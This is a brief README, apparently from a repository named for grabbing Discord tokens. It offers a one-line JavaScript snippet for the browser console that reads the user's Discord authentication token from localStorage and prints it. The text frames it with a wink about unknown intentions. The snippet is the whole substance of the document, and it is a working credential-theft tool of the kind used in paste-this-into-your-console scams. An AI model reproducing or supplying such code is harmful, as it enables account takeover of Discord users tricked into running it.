# jsConsole-discordTokenGrabber

Getting open with javascript console.

Who knows what you are going to do with this code.

# One-liner pasta for javascript console

```js
(function(){let w=window.open();if(!w||!w.document)return console.error('Unable to get token: popup blocked!');window.dispatchEvent(new Event('beforeunload'));console.log(w.localStorage.token);w.close()}());
```

Tested browsers:

Chrome

Safari
